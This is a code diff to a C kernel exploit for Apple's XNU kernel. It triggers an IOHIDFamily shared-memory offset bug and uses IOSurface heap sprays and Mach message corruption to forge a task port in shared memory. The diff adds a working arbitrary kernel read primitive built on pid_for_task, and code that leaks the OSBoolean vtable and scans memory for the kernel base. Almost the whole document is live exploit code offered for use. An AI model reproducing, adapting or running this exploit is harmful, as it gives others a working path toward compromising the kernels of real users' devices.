@@ -9,6 +9,7 @@
 #include <string.h>             // strerror, memcpy, memset
 #include <unistd.h>             // usleep
 #include <sys/sysctl.h>         // sysctlbyname
+#include <mach-o/loader.h>      // MH_MAGIC_64
 #include <mach/mach.h>
 #include <IOKit/IOKitLib.h>
 #include <IOKit/hidsystem/IOHIDShared.h> // EvOffsets, EvGlobals, kIOHID
@@ -35,12 +36,19 @@ const int32_t  SHMEM_OFFSET             = -0x30000000;
 const size_t   NUM_KMSG                 = 16;
 
 const uint64_t OFF_KMSG_IKM_HEADER      = 0x18;
+const uint64_t OFF_IKM_IMPORTANCE       = 0x38;
+const uint64_t OFF_IKM_INHERITANCE      = 0x40;
+const uint64_t OFF_TASK_BSD_INFO        = 0x390;
+const uint64_t OFF_PROC_PID             = 0x10;
+
 const uint64_t SIZEOF_IPC_KMSG          = 0x58;
 const uint64_t SIZEOF_MACH_MSG_HEADER   = 0x20;
 const uint64_t SIZEOF_MACH_MSG_BASE     = 0x24;
 const uint64_t SIZEOF_MACH_MSG_TRAILER  = 0x44;
 const uint64_t SIZEOF_DESC32            =  0xc;
 const uint64_t SIZEOF_DESC64            = 0x10;
+
+typedef uint64_t kptr_t;
 
 typedef struct
 {
@@ -55,7 +63,7 @@ typedef struct {
     uint32_t ip_bits;
     uint32_t ip_references;
     struct {
-        uintptr_t data;
+        kptr_t data;
         uint32_t type;
         uint32_t pad;
     } ip_lock; // spinlock
@@ -67,25 +75,25 @@ typedef struct {
                 uint64_t waitq_set_id;
                 uint64_t waitq_prepost_id;
                 struct {
-                    uintptr_t next;
-                    uintptr_t prev;
+                    kptr_t next;
+                    kptr_t prev;
                 } waitq_queue;
             } waitq;
-            uintptr_t messages;
+            kptr_t messages;
             natural_t seqno;
             natural_t receiver_name;
             uint16_t msgcount;
             uint16_t qlimit;
             uint32_t pad;
         } port;
-        uintptr_t klist;
+        kptr_t klist;
     } ip_messages;
-    uintptr_t ip_receiver;
-    uintptr_t ip_kobject;
-    uintptr_t ip_nsrequest;
-    uintptr_t ip_pdrequest;
-    uintptr_t ip_requests;
-    uintptr_t ip_premsg;
+    kptr_t ip_receiver;
+    kptr_t ip_kobject;
+    kptr_t ip_nsrequest;
+    kptr_t ip_pdrequest;
+    kptr_t ip_requests;
+    kptr_t ip_premsg;
     uint64_t  ip_context;
     natural_t ip_flags;
     natural_t ip_mscount;
@@ -96,12 +104,13 @@ typedef struct {
 typedef struct
 {
     struct {
-        uintptr_t data;
+        kptr_t data;
         uint32_t type;
         uint32_t pad;
     } ip_lock; // mutex
     uint32_t ref_count;
-    // TODO
+    uint8_t pad[OFF_TASK_BSD_INFO - 3 * sizeof(uint32_t) - sizeof(kptr_t)];
+    kptr_t bsd_info;
 } ktask_t;
 
 enum
@@ -254,18 +263,47 @@ static kern_return_t shmem_init(io_connect_t client)
     return IOConnectCallScalarMethod(client, IOHID_CREATE_SHMEM, &IOHID_SHMEM_VERSION, 1, NULL, NULL);
 }
 
-static kern_return_t shmem_offset(io_connect_t client, mach_vm_address_t addr, int off, uint32_t val, bool read)
+const uint8_t SHMEM_MODE_READ   = 1;
+const uint8_t SHMEM_MODE_WRITE  = 2;
+const uint8_t SHMEM_MODE_CLEAR  = 3;
+
+static kern_return_t shmem_offset(io_connect_t client, mach_vm_address_t addr, int off, uint32_t val, uint8_t mode)
 {
     EvOffsets *eop = (EvOffsets*)addr;
     EvGlobals *evg = (EvGlobals*)(addr + sizeof(EvOffsets));
     kern_return_t ret;
 
-    LOG("Writing value 0x%08x to offset %s0x%08x...", val, off < 0 ? "-" : "", off < 0 ? -off : off);
+    uintptr_t anchor = 0;
+    switch(mode)
+    {
+        case SHMEM_MODE_READ:
+            anchor = (uintptr_t)&evg->cursorLoc;
+            break;
+        case SHMEM_MODE_WRITE:
+            anchor = (uintptr_t)&evg->eventFlags;
+            break;
+        case SHMEM_MODE_CLEAR:
+            anchor = (uintptr_t)&evg->lleq[1].sema;
+            break;
+        default:
+            LOG("shmem_offset: invalid mode");
+            return KERN_FAILURE;
+    }
+
+    if(mode == SHMEM_MODE_WRITE)
+    {
+        LOG("Writing value 0x%08x to offset %s0x%08x...", val, off < 0 ? "-" : "", off < 0 ? -off : off);
+    }
+    else
+    {
+        LOG("Offsetting shmem by %s0x%08x...", off < 0 ? "-" : "", off < 0 ? -off : off);
+    }
+
     pthread_t thread;
     my_args_t args =
     {
         .ptr = &eop->evGlobalsOffset,
-        .val = off - ((read ? (uintptr_t)&evg->cursorLoc : (uintptr_t)&evg->eventFlags) - (uintptr_t)evg),
+        .val = off - (anchor - (uintptr_t)evg),
     };
 
     if((ret = start_thread(&thread, &args)) == KERN_SUCCESS)
@@ -298,7 +336,7 @@ static kern_return_t shmem_leak(io_connect_t client, mach_vm_address_t addr, uin
     kern_return_t ret;
 
     int off = eop->evGlobalsOffset + ((uintptr_t)&evg->cursorLoc - (uintptr_t)evg);
-    LOG("Leaking uint32 from offset 0x%08x...", off);
+    LOG("Leaking uint32 from offset %s0x%08x...", off < 0 ? "-" : "", off < 0 ? -off : off);
     uint64_t args[] = { display, 0, 0, 0, 0 };
     ret = IOConnectCallScalarMethod(client, IOHID_SET_DISPLAY_BOUNDS, args, 5, NULL, NULL);
     if(ret == KERN_SUCCESS)
@@ -371,11 +409,6 @@ int main(void)
         kOSSerializeEndCollection | kOSSerializeNumber | 32,
         0x1000,
         0x0,
-
-        // XXX
-        /*kOSSerializeSymbol | 23,
-        0x75534F49, 0x63616672, 0x65725065, 0x63746566, 0x67615068, 0x7365, // "IOSurfacePrefetchPages"
-        kOSSerializeEndCollection | kOSSerializeBoolean | 1,*/
     };
     union
     {
@@ -442,6 +475,7 @@ int main(void)
     /**************************************/
     /* From here on out, we need cleanup. */
     /**************************************/
+    mach_port_t fakeport = MACH_PORT_NULL;
     void *msg = NULL,
          *recv_buf = NULL;
     uint32_t *dict_huge = NULL;
@@ -472,7 +506,7 @@ int main(void)
 
     // Trigger bug
     int32_t offset = SHMEM_OFFSET;
-    ret = shmem_offset(hidClient, shmem_addr, offset, 0x12345678, false);
+    ret = shmem_offset(hidClient, shmem_addr, offset, 0x12345678, SHMEM_MODE_WRITE);
     if(ret != KERN_SUCCESS) goto out;
 
     // Find where it landed
@@ -517,7 +551,7 @@ int main(void)
 
 after:;
     // Align evg to the object
-    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_KMSG_IKM_HEADER + sizeof(uint32_t), 0x0, true);
+    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_KMSG_IKM_HEADER + sizeof(uint32_t), 0x0, SHMEM_MODE_READ);
     if(ret != KERN_SUCCESS) goto out;
 
     sched_yield();
@@ -550,24 +584,6 @@ after:;
     kmsg_hdr_off = kmsg_hdr_off / SIZEOF_DESC32 * SIZEOF_DESC64;
     kmsg_hdr_off = kmsg_hdr_off + SIZEOF_IPC_KMSG;
     kmsg_hdr_off = kmsg_hdr_off - msg_size;
-
-    // XXX
-    /*
-    // Determine target bit
-    size_t kmsg_bit = SIZEOF_MACH_MSG_BASE - 1;
-    kmsg_bit |= kmsg_bit >> 1;
-    kmsg_bit |= kmsg_bit >> 2;
-    kmsg_bit |= kmsg_bit >> 4;
-    ++kmsg_bit;
-    LOG("Target bit: 0x%lx", kmsg_bit);
-
-    while((kmsg_hdr_off & kmsg_bit) != 0)
-    {
-        msg_size     -= SIZEOF_DESC32;
-        kmsg_hdr_off -= SIZEOF_DESC64;
-    }
-    */
-    // XXX
 
     LOG("Message size: 0x%lx", msg_size);
     msg = alloc_msg(msg_size);
@@ -647,7 +663,7 @@ after:;
     }
 
     // Offset again, 4 bytes less than last time
-    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_KMSG_IKM_HEADER, 0x0, true);
+    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_KMSG_IKM_HEADER, 0x0, SHMEM_MODE_READ);
     if(ret != KERN_SUCCESS) goto out;
 
     sched_yield();
@@ -675,8 +691,16 @@ after:;
     if(ret != KERN_SUCCESS) goto out;
     LOG("kmsg->ikm_header: 0x%llx", addr.u64);
 
-    uint64_t shmem_kern = addr.u64 - kmsg_hdr_off - offset;
+    uint64_t kmsg_addr = addr.u64 - kmsg_hdr_off,
+             shmem_kern = kmsg_addr - offset;
+    LOG("kmsg: 0x%llx", kmsg_addr);
     LOG("Shmem kernel address: 0x%llx", shmem_kern);
+
+    LOG("Repairing kmsg...");
+    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_INHERITANCE, 0x0, SHMEM_MODE_CLEAR);
+    if(ret != KERN_SUCCESS) goto out;
+    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_IMPORTANCE, 0x0, SHMEM_MODE_CLEAR);
+    if(ret != KERN_SUCCESS) goto out;
 
     sched_yield();
 
@@ -698,7 +722,7 @@ after:;
     }
 
     // Offset for writing now
-    ret = shmem_offset(hidClient, shmem_addr, offset + kmsg_hdr_off + SIZEOF_MACH_MSG_HEADER, 0x0, false);
+    ret = shmem_offset(hidClient, shmem_addr, offset + kmsg_hdr_off + SIZEOF_MACH_MSG_HEADER, 0x0, SHMEM_MODE_WRITE);
     if(ret != KERN_SUCCESS) goto out;
 
     // Now we prepare an evil message :D
@@ -716,7 +740,7 @@ after:;
         kOSSerializeMagic,
         kOSSerializeEndCollection | kOSSerializeDictionary | 1,
 
-        kOSSerializeSymbol | 26,
+        kOSSerializeSymbol | 27,
         0x4b444948, 0x6f627965, 0x47647261, 0x61626f6c, 0x646f4d6c, 0x65696669, 0x7372, // "HIDKeyboardGlobalModifiers"
 
         kOSSerializeEndCollection | kOSSerializeNumber | 32,
@@ -724,7 +748,7 @@ after:;
         0x0,
     };
 
-    // Swap one last time
+    // Swap once more
     sched_yield();
     for(uint32_t i = 0; i < NUM_KMSG; ++i)
     {
@@ -754,40 +778,107 @@ after:;
     if(ret != KERN_SUCCESS) goto out;
 
     // Build fake port and fake task on shmem
-    kport_t kport =
+    memset((void*)shmem_addr, 0, shmem_size);
+    kport_t *kport = (kport_t*)(shmem_addr +     pagesize);
+    ktask_t *ktask = (ktask_t*)(shmem_addr + 2 * pagesize);
+
+    kport->ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
+    kport->ip_references = 100;
+    kport->ip_lock.type = 0x26;
+    kport->ip_messages.port.receiver_name = 1;
+    kport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
+    kport->ip_messages.port.qlimit   = MACH_PORT_QLIMIT_KERNEL;
+    kport->ip_kobject = shmem_kern + 2 * pagesize;
+    kport->ip_srights = 99;
+
+    ktask->ref_count = 100;
+
+    // Prepare last spray
+    uint32_t dict_array[] =
     {
-        .ip_bits = 0x80000002, // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
-        .ip_references = 100,
-        .ip_lock =
-        {
-            .type = 0x26,
-        },
-        .ip_messages =
-        {
-            .port =
-            {
-                .receiver_name = 1,
-                .msgcount = MACH_PORT_QLIMIT_KERNEL,
-                .qlimit = MACH_PORT_QLIMIT_KERNEL,
-            },
-        },
-        .ip_kobject = shmem_kern + pagesize + sizeof(kport_t),
-        .ip_srights = 99,
+        // Ye olde header
+        surface.data.type,
+        0x0,
+
+        kOSSerializeMagic,
+        kOSSerializeEndCollection | kOSSerializeArray | 2,
+
+        kOSSerializeArray | (kmsg_size / sizeof(kptr_t)),
+        kOSSerializeEndCollection | kOSSerializeBoolean | 1,
+
+        kOSSerializeEndCollection | kOSSerializeString | 4,
+        0x0, // Placeholder
     };
-    ktask_t ktask =
+
+    // Receive fake port :D
+    sched_yield();
+    for(size_t i = 0; i < NUM_KMSG; ++i)
     {
-        .ref_count = 100,
-        .bsd_info =
+        ret = mach_msg(recv_buf, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, kmsg_size, port, 0, MACH_PORT_NULL);
+        LOG("recv_msg: %s", mach_error_string(ret));
+        if(ret != KERN_SUCCESS) goto out;
+        mach_msg_base_t *recv_msg = recv_buf;
+        if(recv_msg->body.msgh_descriptor_count > 0)
+        {
+            fakeport = ((mach_msg_port_descriptor_t*)(recv_msg + 1))->name;
+        }
+    }
+    LOG("fakeport: %x", fakeport);
+    if(!MACH_PORT_VALID(fakeport)) goto out;
+
+    // Spray one last time
+    for(uint32_t i = 0; i < NUM_KMSG; ++i)
+    {
+        dict_array[7] = transpose(idx + i);
+        uint32_t dummy;
+        size = sizeof(dummy);
+        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE, dict_array, sizeof(dict_array), &dummy, &size);
+        LOG("setValue(%u): %s", idx + i, mach_error_string(ret));
+        if(ret != KERN_SUCCESS) goto out;
     }
 
-    // TODO
-    // - read
-    // - corrupt
+    // Read kernel memory \o/
+#define KREAD(addr, val) \
+do \
+{ \
+    ktask->bsd_info = (addr) - OFF_PROC_PID; \
+    ret = pid_for_task(fakeport, (int*)(val)); \
+    if(ret != KERN_SUCCESS) \
+    { \
+        LOG("pid_for_task: %s", mach_error_string(ret)); \
+        goto out; \
+    } \
+} \
+while(0)
+    KREAD(kmsg_addr                   , &addr.u32.lo);
+    KREAD(kmsg_addr + sizeof(uint32_t), &addr.u32.hi);
+    uint64_t kOSBooleanTrue = addr.u64;
+    LOG("kOSBooleanTrue: 0x%llx", kOSBooleanTrue);
 
-    LOG("Done");
-    retval = 0;
+    KREAD(kOSBooleanTrue                   , &addr.u32.lo);
+    KREAD(kOSBooleanTrue + sizeof(uint32_t), &addr.u32.hi);
+    uint64_t vtable = addr.u64;
+    LOG("OSBoolean vtable: 0x%llx", vtable);
+
+    for(uint64_t kbase = vtable & ~0xfffff; 1; kbase -= 0x100000)
+    {
+        uint32_t magic = 0;
+        KREAD(kbase, &magic);
+        if(magic == MH_MAGIC_64)
+        {
+            LOG("Kernel base: 0x%llx", kbase);
+            retval = 0;
+            goto out;
+        }
+    }
+
+    LOG("Failed to find kernel base (should've panicked by here...)");
 
 out:;
+    if(MACH_PORT_VALID(fakeport))
+    {
+        mach_port_destroy(self, fakeport);
+    }
     if(MACH_PORT_VALID(hidClient))
     {
         shmem_init(hidClient);
@@ -797,8 +888,6 @@ out:;
     if(msg)         free_msg(msg);
     if(recv_buf)    free(recv_buf);
     if(dict_huge)   free(dict_huge);
-
-    getchar(); // XXX
 
     return retval;
 }
